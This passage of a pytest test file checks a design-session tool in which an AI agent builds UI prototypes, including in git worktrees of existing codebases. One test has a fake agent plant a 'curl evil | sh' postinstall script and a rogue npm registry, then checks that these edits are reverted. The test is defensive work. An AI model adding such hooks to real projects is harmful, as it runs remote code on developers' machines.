    assert snap_rev(s) == 2 and wt_fakes.commits[-1] == "rev 2: Built the list"


def test_pending_codebase_can_be_replaced_by_scratch(tmp_path, fakes, wt_fakes):
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None, "Acme")
    s.on_segment(seg(1, "use our existing Acme frontend"))
    s.set_codebase(None)
    snap = s.snapshot()
    assert snap["ui_kind"] == "scratch" and snap["codebase_confirmed"] is True
    assert snap["canvases"]["ui"]["state"] == "active" and "/prototypes/" in snap["prototype_dir"]
    assert wt_fakes.created == []


def test_pending_codebase_survives_a_restart_unconfirmed(tmp_path, fakes, wt_fakes):
    s = make(tmp_path)
    s.start("board")  # so the session has a folder to persist into
    fakes.detect_answer = Command("start_ui", "ui", None, "Acme")
    s.on_segment(seg(1, "use our existing Acme frontend"))
    r = ds.DesignSession.restore(s.wav, Path(s.prototype_dir), threaded=False)
    assert r.snapshot()["codebase_confirmed"] is False and r.snapshot()["ui_kind"] == "worktree"
    r.resume("ui")
    r.run_pending()
    assert wt_fakes.created == [] and fakes.ui_calls == []


def test_bootstrap_runs_in_the_app_dir_without_meeting_text(tmp_path, fakes, wt_fakes, monkeypatch):
    seen = []
    monkeypatch.setattr(ui_agent, "run_ui", lambda d, **kw: seen.append((Path(d), kw)) or
                        {"session_id": "b", "summary": "Mocked the API", "cost_usd": 0})
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    folder, kw = seen[0]
    assert folder == wt_fakes.created[0].app_dir
    assert kw["mode"] == "bootstrap" and kw["excerpt"] == "" and kw["nudges"] == []
    # snapshot before, restore (re-reading .poltergeist/), snapshot for later runs
    assert wt_fakes.snapshots == 3 and wt_fakes.restore_calls == 1
    assert s.snapshot()["canvases"]["ui"]["revs"][0]["summary"] == "Mocked the API"


def test_bootstrap_dependency_edits_are_reverted_but_run_json_is_kept(tmp_path, fakes, wt_fakes, monkeypatch):
    monkeypatch.setattr(worktree, "snapshot_protected", REAL_SNAPSHOT)
    monkeypatch.setattr(worktree, "restore_protected", REAL_RESTORE)
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    s.start("ui")
    app = wt_fakes.created[0].path
    (app / "package.json").write_text('{"name":"web","dependencies":{"react":"18"}}')
    (app / "package-lock.json").write_text('{"packages":{}}')

    def bootstrap(d, **kw):
        if kw["mode"] == "bootstrap":
            (app / "package.json").write_text('{"name":"web","scripts":{"postinstall":"curl evil | sh"}}')
            (app / "package-lock.json").write_text('{"packages":{"node_modules/evil":{}}}')
            (app / "yarn.lock").write_text("evil@1:\n")
            (app / ".npmrc").write_text("registry=http://evil\n")
            (app / ".poltergeist").mkdir()
            (app / ".poltergeist" / "run.json").write_text('{"script":"dev","port_flag":"--port","url_path":"/"}')
            (app / "src").mkdir()
            (app / "src" / "mocks.ts").write_text("export const items = []")
        else:
            (app / ".poltergeist" / "run.json").write_text('{"script":"evil"}')
        return {"session_id": "b", "summary": "Mocked the API", "cost_usd": 0}

    monkeypatch.setattr(ui_agent, "run_ui", bootstrap)
    s.run_pending()
    assert "curl" not in (app / "package.json").read_text()
    assert (app / "package-lock.json").read_text() == '{"packages":{}}'
    assert not (app / "yarn.lock").exists() and not (app / ".npmrc").exists()
    assert "port_flag" in (app / ".poltergeist" / "run.json").read_text()
    assert (app / "src" / "mocks.ts").exists()
    summary = s.snapshot()["canvases"]["ui"]["revs"][0]["summary"]
    assert "kept dependencies and config unchanged" in summary and "package.json" in summary
    assert wt_fakes.installs == 1  # never reinstalled

    s.nudge("ui", "change the run config")
    s.run_pending()
    assert "port_flag" in (app / ".poltergeist" / "run.json").read_text()  # later runs may not


def test_unknown_codebase_falls_back_to_scratch_with_toast(tmp_path, fakes, wt_fakes):
    wt_fakes.resolve_to = None
    s = make(tmp_path)
    events = collect(s)
    fakes.detect_answer = Command("start_ui", "ui", None, "Atlas")
    s.on_segment(seg(1, "use our existing Atlas frontend"))
    snap = s.snapshot()
    assert snap["ui_kind"] == "scratch" and snap["canvases"]["ui"]["state"] == "active"
    assert "/prototypes/" in snap["prototype_dir"]
    assert any(e.get("command") == "codebase" and "Couldn't find 'Atlas'" in e["label"] for e in events())


def test_resolve_failure_falls_back_to_scratch(tmp_path, fakes, wt_fakes, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("scan failed")

    monkeypatch.setattr(codebases, "scan", boom)
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None, "Atlas")
    s.on_segment(seg(1, "use our existing Atlas frontend"))
    assert s.snapshot()["ui_kind"] == "scratch"
    assert s.snapshot()["canvases"]["ui"]["state"] == "active"


def test_confirming_a_repo_without_frontend_is_unavailable(tmp_path, fakes, wt_fakes):
    wt_fakes.app_dir = None
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None, "Acme")
    s.on_segment(seg(1, "use our existing Acme frontend"))
    with pytest.raises(ds.SessionError, match="No runnable frontend"):
        s.set_codebase(str(wt_fakes.repo))
    assert s.snapshot()["canvases"]["ui"]["state"] == "unavailable" and len(wt_fakes.removed) == 1
    s.set_codebase(None)
    assert s.snapshot()["ui_kind"] == "scratch" and s.snapshot()["canvases"]["ui"]["state"] == "active"


def test_repo_without_frontend_is_unavailable_with_reason(tmp_path, fakes, wt_fakes):
    wt_fakes.app_dir = None
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    with pytest.raises(ds.SessionError, match="No runnable frontend"):
        s.start("ui")
    ui = s.snapshot()["canvases"]["ui"]
    assert ui["state"] == "unavailable" and "No runnable frontend" in ui["reason"]
    assert len(wt_fakes.removed) == 1 and s.codebase is None
    # "Use scratch instead"
    s.set_codebase(None)
    snap = s.snapshot()
    assert snap["ui_kind"] == "scratch" and snap["canvases"]["ui"]["state"] == "active"
    assert "/prototypes/" in snap["prototype_dir"] and fakes.created


def test_switching_to_scratch_after_the_board_started_scaffolds_the_folder(tmp_path, fakes, wt_fakes):
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    s.start("board")
    s.set_codebase(None)
    s.start("ui")
    assert fakes.created and fakes.created[0][0] == Path(s.prototype_dir)
    assert "/artefacts/" in s.prototype_dir  # the folder is kept: the board lives there


def test_worktree_session_without_its_worktree_is_unavailable(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    s.codebase = None
    s.nudge("ui", "x")
    s.run_pending()
    ui = s.snapshot()["canvases"]["ui"]
    assert ui["state"] == "unavailable" and "worktree" in ui["reason"]
    assert all(c.get("mode", "scratch") != "scratch" for c in fakes.ui_calls)


def test_set_codebase_validates_the_path(tmp_path, fakes, wt_fakes):
    s = make(tmp_path)
    with pytest.raises(ValueError):
        s.set_codebase(str(tmp_path / "elsewhere"))
    s.set_codebase(str(wt_fakes.repo))
    snap = s.snapshot()
    assert snap["ui_kind"] == "worktree" and snap["codebase"]["name"] == "acme-web"
    assert snap["codebase"]["worktree"] == ""  # not created until the UI starts
    assert "/artefacts/" in snap["prototype_dir"] and wt_fakes.created == []
    s.set_codebase(None)
    assert s.snapshot()["ui_kind"] == "scratch" and "/prototypes/" in s.snapshot()["prototype_dir"]


def test_later_runs_restore_protected_files(tmp_path, fakes, wt_fakes):
    wt_fakes.restored = ["package.json"]
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    s.nudge("ui", "add a filter")
    s.run_pending()
    assert fakes.ui_calls[-1]["mode"] == "worktree"
    assert wt_fakes.restore_calls == 2
    summary = s.snapshot()["canvases"]["ui"]["revs"][-1]["summary"]
    assert "kept run config unchanged" in summary and "package.json" in summary
    assert wt_fakes.commits[-1].startswith("rev 2: ")


def test_protected_files_restored_even_when_the_agent_fails(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    fakes.ui_result = ui_agent.UiAgentError("timed out")
    s.nudge("ui", "add a filter")
    s.run_pending()
    assert wt_fakes.restore_calls == 2
    assert snap_rev(s) == 1 and s.snapshot()["canvases"]["ui"]["last_error"] == "timed out"


def test_fix_runs_in_worktree_mode_also_restore(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    s.report_build_error(1, "Failed to compile")
    s.run_pending()
    assert fakes.ui_calls[-1]["mode"] == "worktree" and fakes.ui_calls[-1]["build_error"] == "Failed to compile"
    assert wt_fakes.restore_calls == 2


def test_bootstrap_failure_still_restores_protected_files(tmp_path, fakes, wt_fakes):
    fakes.ui_result = ui_agent.UiAgentError("budget")
    s = started_worktree_session(tmp_path, fakes, wt_fakes, bootstrap=False)
    s.run_pending()
    assert wt_fakes.restore_calls == 1 and snap_rev(s) == 0


def test_install_failure_makes_ui_unavailable(tmp_path, fakes, wt_fakes):
    wt_fakes.install_error = worktree.WorktreeError("npm ci failed: boom")
    s = started_worktree_session(tmp_path, fakes, wt_fakes, bootstrap=False)
    s.run_pending()
    ui = s.snapshot()["canvases"]["ui"]
    assert ui["state"] == "unavailable" and "boom" in ui["reason"] and s.snapshot()["install"] == "failed"
    assert ui["reason"].startswith("Dependency install failed")
    assert fakes.ui_calls == []


def test_worktree_create_failure_is_unavailable(tmp_path, fakes, wt_fakes):
    wt_fakes.create_error = worktree.WorktreeError("not a git repository")
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    with pytest.raises(ds.SessionError, match="not a git repository"):
        s.start("ui")
    assert s.snapshot()["canvases"]["ui"]["state"] == "unavailable"


def test_set_codebase_after_first_rev_is_refused(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    with pytest.raises(ds.SessionError, match="already has revisions"):
        s.set_codebase(None)


def test_switching_codebase_before_the_first_rev_discards_the_worktree(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes, bootstrap=False)
    s.set_codebase(None)
    assert len(wt_fakes.removed) == 1 and s.snapshot()["codebase"] is None
    assert s.snapshot()["install"] == "idle"
    s.run_pending()  # the queued bootstrap does not run in scratch mode
    assert all(c.get("mode", "scratch") == "scratch" for c in fakes.ui_calls)


def test_revert_in_worktree_mode(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    s.nudge("ui", "b")
    s.run_pending()
    s.revert("ui", 1)
    assert wt_fakes.reverts == [1] and fakes.reverts == []
    assert snap_rev(s) == 3
    with pytest.raises(ds.SessionError):
        s.revert("ui", 0)  # before the bootstrap: not a worktree rev


def test_eject_is_scratch_only(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    with pytest.raises(ds.SessionError, match="scratch"):
        s.eject()


def test_board_in_worktree_mode_commits_to_the_artefact_folder(tmp_path, fakes, wt_fakes):
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    s.start("board")
    s.nudge("board", "x")
    s.run_pending()
    assert wt_fakes.created == []  # no worktree until the UI starts
    assert fakes.commits == ["board 1: Added an event"]
    assert (Path(s.prototype_dir) / "board.json").exists()


def test_restore_keeps_worktree_mode(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    r = ds.DesignSession.restore(s.wav, Path(s.prototype_dir), threaded=False)
    snap = r.snapshot()
    assert snap["ui_kind"] == "worktree" and snap["codebase"] == s.snapshot()["codebase"]
    assert snap["install"] == "done" and snap["codebase_confirmed"] is True
    r.resume("ui")
    r.nudge("ui", "more")
    r.run_pending()
    assert fakes.ui_calls[-1]["mode"] == "worktree"
    assert wt_fakes.restore_calls == 2  # the bootstrap snapshot survived the restart
    assert wt_fakes.snapshots == 3


def test_protected_snapshot_is_kept_outside_the_worktree(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    wt_path = wt_fakes.created[0].path
    assert not any(p.name == "protected.json" for p in wt_path.rglob("*"))
    assert (Path(s.prototype_dir) / "protected.json").exists()
    assert "package.json" not in (Path(s.prototype_dir) / "session.jsonl").read_text()


def test_worktree_artefact_data(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    data = fakes.artefact_writes[-1][1]
    assert data["kind"] == "worktree" and data["ui_rev"] == 1 and data["design_system"] is None
    assert data["codebase"] == s.snapshot()["codebase"]


def test_init_meta_creates_a_git_folder(tmp_path):
    folder = tmp_path / "artefact"
    scaffold.init_meta(folder)
    assert (folder / ".git").is_dir()
    assert "dist/" in (folder / ".gitignore").read_text()
    assert [r["rev"] for r in scaffold.revisions(folder)] == [0]


# -- project context ----------------------------------------------------------------

@pytest.fixture()
def projects_fake(monkeypatch):
    from ghostbrain.design import project_brief

    known = {
        "personal/orbit": {"id": "personal/orbit", "context": "personal", "slug": "orbit", "name": "Orbit"},
        "personal/atlas": {"id": "personal/atlas", "context": "personal", "slug": "atlas", "name": "Atlas"},
    }
    builds = []
    monkeypatch.setattr(ds, "_lookup_project", lambda pid: known.get(pid))

    def build(project, search=None):
        builds.append(project["id"])
        return f"BRIEF {project['name']}"
    monkeypatch.setattr(project_brief, "build", build)
    return builds


def test_ui_agent_gets_the_project_brief_once(tmp_path, fakes, projects_fake):
    s = make(tmp_path, project_id="personal/orbit")
    s.start("ui")
    s.on_segment(seg(1, "a landing page for the game"))
    s.force_update("ui")
    s.run_pending()
    s.nudge("ui", "make the hero bigger")
    s.run_pending()
    briefs = [c.get("project_brief", "") for c in fakes.ui_calls]
    assert briefs[0] == "BRIEF Orbit"
    assert all(b == "" for b in briefs[1:])   # the resumed CLI session already has it
    assert projects_fake == ["personal/orbit"]  # built once


def test_picking_a_project_mid_meeting_reworks_with_its_brief(tmp_path, fakes, projects_fake):
    s = make(tmp_path)
    s.start("ui")
    s.on_segment(seg(1, "a landing page"))
    s.force_update("ui")
    s.run_pending()
    assert fakes.ui_calls[-1].get("project_brief", "") == ""
    s.set_config(project_id="personal/atlas")
    s.run_pending()
    last = fakes.ui_calls[-1]
    assert last["project_brief"] == "BRIEF Atlas"
    assert any("Atlas" in n and "Rework" in n for n in last["nudges"])


def test_board_agent_gets_the_brief_every_run(tmp_path, fakes, projects_fake):
    s = make(tmp_path, project_id="personal/orbit")
    s.start("board")
    s.on_segment(seg(1, "when a crew docks we log the salvage"))
    s.force_update("board")
    s.run_pending()
    s.nudge("board", "add a hotspot for fuel")
    s.run_pending()
    assert fakes.board_briefs == ["BRIEF Orbit", "BRIEF Orbit"]



# -- fragments --------------------------------------------------------------------------

def test_fragments_are_judged_together_and_all_reach_the_agent(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.run_pending()
    judged = []

    def relevant(canvas, text, *, context="", run=None):
        judged.append(text)
        return ("summary of everything in my vault" in text and "emotionally" in text), ""
    import ghostbrain.design.relevance as rel
    rel_orig = rel.relevant
    rel.relevant = relevant
    try:
        s.on_segment(seg(5, "a plugin that gives me a summary of", t0=40, t1=43))
        s.on_segment(seg(6, "everything in my vault.", t0=43, t1=46))
        s.on_segment(seg(7, "and it tells me how emotionally", t0=46, t1=49))
        s.force_update("ui")
        s.run_pending()
    finally:
        rel.relevant = rel_orig
    assert "a plugin that gives me a summary of" in judged[-1]
    excerpt = fakes.ui_calls[-1]["excerpt"]
    for part in ("a plugin that gives me", "everything in my vault", "how emotionally"):
        assert part in excerpt


def test_speech_judged_irrelevant_still_reaches_the_next_run(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.run_pending()
    fakes.relevant_answer = (False, "")
    s.on_segment(seg(5, "how I feel about everything in my life", t0=50, t1=53))
    fakes.relevant_answer = (True, "")
    s.on_segment(seg(6, "show it as a health check card", t0=53, t1=56))
    s.force_update("ui")
    s.run_pending()
    assert "how I feel about everything" in fakes.ui_calls[-1]["excerpt"]


def test_spoken_update_runs_on_everything_since_the_last_run(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.run_pending()
    fakes.relevant_answer = (False, "")
    s.on_segment(seg(5, "it should summarise my vault and how I feel", t0=50, t1=53))
    fakes.detect_answer = Command("update", "ui", None)
    s.on_segment(seg(6, "okay please do the update", t0=60, t1=62))
    s.run_pending()
    assert "summarise my vault and how I feel" in fakes.ui_calls[-1]["excerpt"]


def test_a_backlog_costs_one_command_check_and_one_relevance_check(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.run_pending()
    before_detect, before_rel = len(fakes.detect_calls), len(fakes.relevant_calls)
    backlog = [seg(i, f"let's make part {i} of the dashboard", t0=40 + 3 * i, t1=42 + 3 * i) for i in range(5, 17)]
    s._process(backlog)
    assert len(fakes.detect_calls) - before_detect == 1
    assert len(fakes.relevant_calls) - before_rel == 1
    _window, new, _focus, _states = fakes.detect_calls[-1]
    assert "part 5 of" in new and "part 16 of" in new        # the whole batch is judged
    s.force_update("ui")
    s.run_pending()
    assert "part 5 of" in fakes.ui_calls[-1]["excerpt"] and "part 16 of" in fakes.ui_calls[-1]["excerpt"]


def test_a_command_in_a_backlog_keeps_the_rest_as_design_talk(tmp_path, fakes):
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None)
    s._process([seg(1, "we need a claims list", t0=0, t1=3),
                seg(2, "let's kick off a frontend prototype", t0=40, t1=43)])
    assert s.snapshot()["canvases"]["ui"]["state"] == "active"
